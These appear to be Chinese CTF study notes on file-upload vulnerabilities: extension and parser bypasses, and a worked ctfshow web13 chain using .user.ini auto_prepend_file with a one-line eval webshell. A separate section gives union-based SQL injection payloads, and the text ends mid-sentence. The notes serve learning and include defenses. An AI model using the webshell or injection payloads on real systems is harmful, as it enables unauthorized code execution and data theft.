# 文件上传漏洞 · 基本理
##  0x01 上传漏洞定义
   文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果.
## 一、先建立一个模型

文件上传本身不是漏洞，**「上传的文件被服务器当成代码执行 / 被其他组件解释」才是漏洞**。

所以分析任何上传题，只问三个问题：

```
① 能不能传上去？        → 校验层（前端/后端、名字/后缀/内容/大小）
② 落在哪里？            → 路径层（网站根目录？上传目录？能不能访问？）
③ 落了以后会怎样？      → 解析层（会不会被 PHP/JSP/ASP 执行？被谁解释？）
```

三问里任意一环成立，就可能拿到 RCE。ctfshow web13 是典型的 **②③ 成立、① 有缺口**：

- ① 校验只看「文件名长度 + 后缀长度 + 后缀字符」，没看「文件用途」
- ② 用原文件名落到网站根目录，URL 可直接访问
- ③ `.user.ini` 被 PHP-FPM 当成目录配置读取 → 间接执行

---

## 二、校验层：常见的七道关卡

| # | 关卡 | 检查什么 | 常见绕过 |
|---|---|---|---|
| 1 | 前端 JS / `accept` | 浏览器端过滤 | 抓包、禁用 JS、直接构造请求 |
| 2 | `Content-Type` | MIME 头 | 改成 `image/jpeg` 等 |
| 3 | 后缀黑名单 | 不含 php/asp/jsp | 大小写、双写、别名后缀、`.htaccess`/`.user.ini`、尾点/空格、`::$DATA`、`%00` |
| 4 | 后缀白名单 | 只允许 jpg/png | 配合**解析漏洞**（多后缀、PATH_INFO）、图片马、二次渲染 |
| 5 | 内容检测 | 文件头/魔术字节 | 加 GIF89a 头、图片马、polyglot |
| 6 | 大小限制 | `size > N` | 极简 payload、分块、**两文件协作** |
| 7 | 文件名规则 | 长度/字符/路径 | 路径穿越 `../`、超长截断、竞争条件 |

### 2.1 黑名单绕过清单

| 手法 | 例子 | 说明 |
|---|---|---|
| 大小写 | `a.Php` | 过滤没加 `/i` 时有效 |
| 双写 | `a.pphphp` | 替换函数只删一次 |
| 别名后缀 | `.php3 .php4 .php5 .phtml .pht .phar` | 取决于中间件映射 |
| 尾点/空格 | `a.php.` / `a.php ` | Windows 落盘时自动去掉尾部点和空格 |
| NTFS 流 | `a.php::$DATA` | Windows 下生成 `a.php` |
| 截断 | `a.php%00.jpg` | PHP < 5.3.4 / 老中间件有效 |
| 换行 | `a.php%0A` | Apache CVE-2017-15715 |
| 配置文件 | `.htaccess` / `.user.ini` / `web.config` | 不执行也生效，改变解析行为 |

### 2.2 白名单下的思路

白名单只允许图片，正面刚后缀没用，要换思路：

1. **让图片变可执行**：`.htaccess` 给 `.jpg` 加 PHP handler（Apache）
2. **利用解析漏洞**：多后缀、PATH_INFO（见第三节）
3. **图片马**：图片里塞 PHP 代码，配合文件包含（LFI）去执行
4. **二次渲染绕过**：头像重绘后 payload 还在（GIF 调色板/注释段最稳）
5. **phar 反序列化**：`phar://` 触发元数据反序列化，不需要文件被执行

---

## 三、解析层：中间件决定了「什么文件会被执行」

### 3.1 Apache

```
AddType application/x-httpd-php .php     → 所有 .php 结尾执行
AddHandler application/x-httpd-php .php  → 从右往左找第一个认识的扩展名
```

- **多后缀**：`a.php.jpg` 在 `AddHandler` + 某些配置下会被当 PHP 执行
- **`.htaccess`**：`AddType application/x-httpd-php .jpg` → 目录内所有 jpg 变 PHP
- **CVE-2017-15715**：`a.php%0A` 绕过 `<FilesMatch \.php$>`

### 3.2 Nginx + PHP-FPM

- 通常 `location ~ \.php$ { fastcgi_pass ...; }`，**只认 .php 结尾**
- 老配置 + `cgi.fix_pathinfo=1`：`/a.jpg/x.php` → FPM 找不到 `x.php`，回退执行 `a.jpg`
- 现代配置有 `try_files $uri =404` 或 `security.limit_extensions`，这条路基本堵死
- **FPM 特有**：`.user.ini` 目录级配置（本题用的就是它）

### 3.3 IIS

- IIS 6：`a.asp;.jpg`（分号截断）
- IIS 7：`a.aspx/.jpg`（PATH_INFO）
- 通用：`a.asp%00.jpg`

### 3.4 为什么 `.user.ini` 属于「解析层」而不是「校验层」

它不改变「文件后缀到处理器的映射」，而是直接改 **PHP 运行时行为**：

```
auto_prepend_file = a.txt   → 每个 PHP 请求先包含 a.txt
```

即使你一个 `.php` 文件都传不上去，只要目录里有 PHP 文件（如 `index.php`），
访问它就会触发你的代码。

---

## 四、配置注入家族（重点）

| 文件 | 生效环境 | 典型内容 | 前提 |
|---|---|---|---|
| `.htaccess` | Apache | `AddType application/x-httpd-php .jpg` | `AllowOverride All` |
| `.user.ini` | PHP-FPM / CGI | `auto_prepend_file=a.txt` | `user_ini.filename=.user.ini`（默认） |
| `web.config` | IIS 7+ | `<add name="php" path="*.jpg" verb="*" .../>` | IIS 允许 |

三者共同点：**文件名本身人畜无害，但内容是「配置」，会改变同目录其他文件的解析方式。**

`.user.ini` 的两个关键约束：

1. 只能写 `PHP_INI_PERDIR` / `PHP_INI_USER` 级别的指令（`auto_prepend_file` 是 PERDIR，可写）
2. 有缓存：`user_ini.cache_ttl` 默认 300 秒，改完不是立刻生效

---

## 五、其它利用链（超出「传个 shell」）

| 类型 | 原理 | 目标 |
|---|---|---|
| 目录穿越 | 文件名含 `../`，写到任意目录 | 覆盖配置、写 crontab、写 SSH key |
| 竞争条件 | 校验/删除之间的时间窗 | 先访问再被删 |
| zip 解压 | zip 内文件名含 `../`（zip slip） | 任意文件写 |
| phar | `phar://` 触发元数据反序列化 | 不需要文件被执行 |
| 头像/图片 | 上传 SVG、HTML | 存储型 XSS、SSRF |
| 大文件 | 上传超大文件 | DoS、撑爆磁盘 |

---

## 六、实战判断流程（拿到题先走一遍）

```
1. 看首页/表单 → 字段名、是否前端校验
2. 找源码 → .bak/.swp/.git/www.zip（这一步最容易被跳过）
3. 读校验逻辑 → 名字？后缀？大小？MIME？内容？
4. 判断中间件 → nginx/apache/iis + PHP/JSP/ASP
5. 试最小上传 → 观察报错文案（报错就是提示）
6. 选路线：
   ├─ 后缀宽松 → 直接 shell
   ├─ 后缀白名单 → .htaccess / .user.ini / 解析漏洞
   ├─ 大小很小 → 两文件协作 / 极简 payload
   └─ 有路径穿越 → 写配置/计划任务
7. 落地验证 → 访问 URL / 列目录 / 读文件
```

---

## 七、这道题在理论里的位置

| 维度 | ctfshow web13 |
|---|---|
| 校验缺口 | 只看后缀长度和字符，不看文件用途 |
| 落地位置 | 网站根目录，原名保存 |
| 利用方式 | **配置注入**（`.user.ini` + `auto_prepend_file`） |
| 额外限制 | 内容 ≤24 字节 → 两文件协作（配置 + 短 payload） |
| 执行链 | HTTP 请求 → FPM 读 .user.ini → 先跑 a.txt → eval 参数 |

**同类题的变体**：把大小限制去掉 → 直接传 `.user.ini` + 完整 webshell；换成 Apache → `.htaccess`；换成 IIS → `web.config`；加 `open_basedir` → 只能读受限目录。

---

## 八、防御理论

上传功能的安全设计，按优先级：

1. **存储与解析分离**：上传目录不允许执行脚本（nginx 不转发给 FPM、Apache 关 `Options -ExecCGI`）
2. **禁用目录级配置**：`user_ini.filename =`（置空）；Apache `AllowOverride None`
3. **重命名落盘**：随机 UUID + 白名单后缀，不保留用户文件名
4. **白名单校验**：`finfo_file()` 查真实 MIME，而不是信 `Content-Type` 或后缀字符串
5. **限制爆炸半径**：`open_basedir`、`disable_functions`、上传目录只读、独立域名
6. **内容安全**：图片重编码（去元数据）、病毒扫描

一句话：**不要把「用户上传的文件」放进「能被解释执行的位置」，也不要让「目录里的配置文件」由用户控制。**

---
工具：Burp Suite（改包）、`dirsearch`/`gobuster`（找源码）、中国蚁剑（连 shell）、`phpggc`（phar 链）。
---
## 九、一句话总结

**上传题考的不是「怎么传一个 shell」，而是「服务器的三套规则（校验、路径、解析）在哪一环没对齐」。**
校验只管后缀、路径就在根目录、解析靠目录配置——三者一叠加，就是 web13。
# 判断联合注入列数 + 回显位置
 
核心方法：order by 猜列数
order by N：按照第N列排序。如果N超过真实列数，SQL报错。

假设原始语句： select * from 表 where id='$query' 
 
步骤1：猜总共有多少列
 
依次输入测试：
 
plaintext
  
1' order by 1 --+
 
 
页面正常 → 至少1列
 
plaintext
1' order by 2 --+
页面正常 → 至少2列
plaintext
1' order by 3 --+
页面正常 → 至少3列
plaintext
1' order by 4 --+
页面报错/和前面不一样 → 说明只有3列
 
✅ 结论：这张查询返回 3列
所以union后面的select，必须写3个值： select 1,2,3 
 
重点：union 前后两个select，列数量必须相等，不然语法报错。
 
步骤2：找回显位置（哪一列会打印在页面上）
 
知道一共3列之后，用：
 
plaintext
  
-1' union select 1,2,3 --+
 
 
- 如果页面输出了  2  → 第二列是回显位，以后我们要查的内容就放在第二个位置
也就是  select 1,你要查的内容,3 
- 如果页面输出  1  → 第一列回显
- 如果页面输出  3  → 第三列回显
 
放到你这道题里：
 -1' union select 1,table_name,3 
就是因为测出总共3列，并且回显在第2个位置，所以把 table_name 放在中间。
 
举个完整流程
 
1.  1' order by 1--+  正常
2.  1' order by 2--+  正常
3.  1' order by 3--+  正常
4.  1' order by 4--+  异常
→ 列数=3
5.  -1' union select 1,2,3--+  页面出现数字2
→ 回显位是第2位
6. 后续payload都写成  select 1,想要的数据,3 
 
容易踩坑点
 
1. 必须用  -1  让前面查询查不到数据，不然页面只会展示原来数据库的数据，看不到union的内容
2. 先测order by，不要直接写查表语句，列数不对会直接失效（也就是你之前一直返回原界面的原因之一）
3. 同样，这个payload最好在地址栏或者Burp里发，输入框容易转义单引号
# php.ini            → 全局（整个 PHP 进程）
.user.ini          → 目录级（PHP-FPM / CGI 模式下，每个目录自己读）
ini_set()          → 运行时（只能改 PHP_INI_ALL 级别的项）
user_ini.filename 默认就是 .user.ini，所以 PHP-FPM 每处理一个请求，都会从脚本所在目录往上找 .user.ini，读里面的键值对，覆盖全局配置。

但不是什么指令都能写——只能写 PHP_INI_PERDIR 或 PHP_INI_USER 级别的项。而 auto_prepend_file 正好是 PHP_INI_PERDIR，允许写在 .user.ini 里。

这就是这道题的钥匙：不能传 .php，但能传一个改变 PHP 行为的配置文件。
# auto_prepend_file 干了什么
它的语义是：在执行任何 PHP 脚本之前，先把这个文件当 PHP 包含进来执行一遍。

代码块


请求 /index.php?a=print_r(scandir('.'));
        │
        ├─ nginx 把 .php 交给 php-fpm
        │
        ├─ php-fpm 读 /var/www/html/.user.ini
        │      └─ auto_prepend_file = a.txt
        │
        ├─ 先执行 /var/www/html/a.txt   ← 我们的代码
        │      └─ <?=eval($_GET[a]);?>   ← 把 URL 参数当 PHP 代码跑
        │
        └─ 再执行 index.php（正常页面）
所以命令的输出会出现在页面最上面、<html> 之前——因为它在主脚本之前就跑完了。

a.txt 能被执行，是因为 include 一个文件时，PHP 会按 PHP 语法解析它，<?= ... ?> 就是合法的 PHP 短 echo 标签（PHP 5.4+ 永远可用，不受 short_open_tag 影响）。

于是 ?a=print_r(scandir('.')); 等价于在服务器上执行：

php


<?php print_r(scandir('.')); ?>
四、a.txt 为什么必须这么短
?a= 里的代码不受 24 字节限制（限制只作用于上传的文件内容），所以真正的 payload 放在 URL 里，a.txt 只需要一个“转发器”：

php


<?=eval($_GET[a]);?>     // 20 字节
eval() 把 GET 参数当 PHP 代码执行，长度随便写。这就是“小文件 + 大参数”的组合拳。

五、为什么要等 5 分钟
.user.ini 不是每次请求都重新读盘，PHP-FPM 有缓存：
ini
user_ini.cache_ttl = 300   ; 默认 300 秒
而且每个 FPM worker 进程各缓存各的——上传完立刻访问，可能命中的是还没刷新的 worker，所以表现就是“传上去了但没反应”。我